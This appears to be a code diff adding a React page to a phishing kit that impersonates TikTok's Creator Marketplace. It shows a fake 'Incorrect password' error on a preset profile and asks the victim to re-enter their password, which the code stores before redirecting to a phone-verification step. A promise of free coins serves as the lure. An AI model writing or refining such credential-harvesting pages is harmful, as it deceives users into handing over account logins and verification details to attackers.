@@ -1,0 +1,169 @@
+import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
+import { Button } from '../components/ui/button';
+import { Input } from '../components/ui/input';
+import { AlertTriangle, Eye, EyeOff, X } from 'lucide-react';
+
+const IncorrectPasswordPage = () => {
+  const navigate = useNavigate();
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const coinAmount = localStorage.getItem('coinAmount') || '100,000';
+
+  const mockUserData = {
+    name: 'andrei.ciuciu',
+    username: '@andrei.ciuciu',
+    followers: '532.4K',
+    following: '8.5K',
+    likes: '4.5M',
+    avatar: 'https://i.pravatar.cc/150?img=12'
+  };
+
+  const passwordRequirements = [
+    { text: 'At least 8 characters', met: password.length >= 8 },
+    { text: 'At least 1 uppercase letter', met: /[A-Z]/.test(password) },
+    { text: 'At least 1 special character', met: /[!@#$%^&*(),.?":{}|<>]/.test(password) }
+  ];
+
+  const handleTryAgain = () => {
+    localStorage.setItem('password', password);
+    navigate('/verify-phone');
+  };
+
+  return (
+    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
+      {/* Header */}
+      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
+        <div className="flex items-center gap-3">
+          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
+          <div className="flex gap-1.5">
+            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
+            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
+          </div>
+          <div className="ml-2">
+            <div className="text-white text-sm font-semibold">Creator</div>
+            <div className="text-white text-sm font-semibold">Marketplace</div>
+          </div>
+        </div>
+        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
+          Login
+        </Button>
+      </header>
+
+      {/* Main Content */}
+      <main className="max-w-4xl mx-auto px-6 py-12">
+        {/* Title */}
+        <div className="text-center mb-8">
+          <h1 className="text-6xl font-black mb-4">
+            <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
+              TikTok
+            </span>
+          </h1>
+          <p className="text-cyan-400 text-2xl font-semibold">Incorrect Password</p>
+        </div>
+
+        {/* Profile Card */}
+        <div className="bg-[#1a1a1c] border border-gray-700 rounded-2xl p-8 mb-8">
+          <div className="flex items-center gap-6 mb-6">
+            <div className="relative">
+              <img
+                src={mockUserData.avatar}
+                alt="Profile"
+                className="w-24 h-24 rounded-full border-4 border-cyan-400"
+              />
+            </div>
+            <div>
+              <h2 className="text-white text-2xl font-bold">{mockUserData.name}</h2>
+              <p className="text-cyan-400 text-lg">{mockUserData.username}</p>
+            </div>
+          </div>
+          <div className="grid grid-cols-3 gap-6 text-center">
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.followers}</div>
+              <div className="text-gray-400 text-sm">Followers</div>
+            </div>
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.following}</div>
+              <div className="text-gray-400 text-sm">Following</div>
+            </div>
+            <div>
+              <div className="text-white text-2xl font-bold">{mockUserData.likes}</div>
+              <div className="text-gray-400 text-sm">Likes</div>
+            </div>
+          </div>
+        </div>
+
+        {/* Error Alert */}
+        <div className="bg-[#1a1a1c] border-2 border-yellow-500 rounded-xl p-6 mb-8">
+          <div className="flex items-center justify-center mb-4">
+            <AlertTriangle className="w-12 h-12 text-yellow-500" />
+          </div>
+          <p className="text-[#fe2c55] text-xl font-bold text-center mb-2">Incorrect password entered!</p>
+          <p className="text-gray-400 text-center">Please enter the correct password for your account.</p>
+        </div>
+
+        {/* Username Input */}
+        <div className="mb-6">
+          <label className="text-white text-lg mb-3 block">Username</label>
+          <Input
+            type="text"
+            value="andrei.ciuciu"
+            readOnly
+            className="w-full bg-[#1a1a1c] border border-gray-700 text-gray-400 px-4 py-6 text-lg rounded-lg"
+          />
+        </div>
+
+        {/* Password Input */}
+        <div className="mb-6">
+          <label className="text-white text-lg mb-3 block">Password</label>
+          <div className="relative">
+            <Input
+              type={showPassword ? 'text' : 'password'}
+              placeholder="Enter your password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="w-full bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 pr-12"
+            />
+            <button
+              type="button"
+              onClick={() => setShowPassword(!showPassword)}
+              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors"
+            >
+              {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
+            </button>
+          </div>
+        </div>
+
+        {/* Password Requirements */}
+        <div className="mb-8 space-y-2">
+          {passwordRequirements.map((req, index) => (
+            <div key={index} className="flex items-center gap-2">
+              <X className="w-5 h-5 text-[#fe2c55]" />
+              <span className="text-[#fe2c55] text-sm">{req.text}</span>
+            </div>
+          ))}
+        </div>
+
+        {/* Try Again Button */}
+        <Button
+          onClick={handleTryAgain}
+          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#2a2a2c] hover:to-[#1a1a1c] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all"
+        >
+          Try Again
+        </Button>
+
+        {/* Coins Display */}
+        <div className="mt-8 text-center">
+          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
+            <span className="text-gray-400 text-lg">You will receive: </span>
+            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
+            <span className="text-gray-400 text-lg"> Coins</span>
+          </div>
+        </div>
+      </main>
+    </div>
+  );
+};
+
+export default IncorrectPasswordPage;
